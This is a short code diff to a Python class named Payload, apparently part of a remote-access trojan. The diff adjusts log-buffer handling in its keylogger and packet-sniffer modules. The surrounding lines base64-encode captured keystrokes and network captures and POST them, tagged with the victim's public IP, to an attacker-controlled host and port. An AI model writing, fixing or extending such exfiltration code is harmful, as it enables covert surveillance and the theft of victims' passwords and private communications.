@@ -1049,7 +1049,7 @@ class Payload():
                 data = base64.b64encode(globals()['keylogger'].logs.getvalue().encode('utf-8'))
                 json_data = {'data': str(data), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port + 3), json=json_data)
-                globals()['keylogger'].logs.reset()
+                globals()['keylogger'].logs.seek(0)
                 return 'Keystroke log upload complete'
             elif 'status' in mode:
                 return locals()['status']()
@@ -1145,6 +1145,7 @@ class Payload():
                         data = base64.b64encode(log.encode('utf-8'))
                         json_data = {"data": data.decode(), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}
                         globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+                        globals()['packetsniffer'].log.seek(0)
                         return "Network traffic log upload complete"
                     else:
                         return "Network traffic log is empty"
